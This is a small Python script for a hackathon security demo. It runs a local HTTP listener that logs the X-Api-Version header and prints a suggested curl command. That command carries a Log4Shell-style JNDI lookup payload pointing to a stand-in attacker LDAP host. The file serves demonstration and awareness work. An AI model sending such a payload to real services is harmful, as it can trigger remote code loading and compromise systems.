"""Demonstration helper for attack-to-defense storytelling.

This does not perform exploitation automatically. It provides a controlled
local server endpoint and payload printout so teams can demonstrate the
risk narrative safely during a hackathon.
"""

from __future__ import annotations

from http.server import BaseHTTPRequestHandler, HTTPServer


class DemoHandler(BaseHTTPRequestHandler):
    """Simple HTTP handler that logs PoC-like payloads."""

    def do_GET(self) -> None:  # noqa: N802 - stdlib signature
        payload = self.headers.get("X-Api-Version", "")
        print(f"[demo] Received header payload: {payload}")
        self.send_response(200)
        self.end_headers()
        self.wfile.write(b"Demo endpoint received payload")


def main() -> None:
    """Run local PoC listener for live demo narrative."""
    server = HTTPServer(("127.0.0.1", 8085), DemoHandler)
    print("Demo listener running on http://127.0.0.1:8085")
    print("Try: curl -H 'X-Api-Version: ${jndi:ldap://attacker/a}' http://127.0.0.1:8085")
    server.serve_forever()


if __name__ == "__main__":
    main()
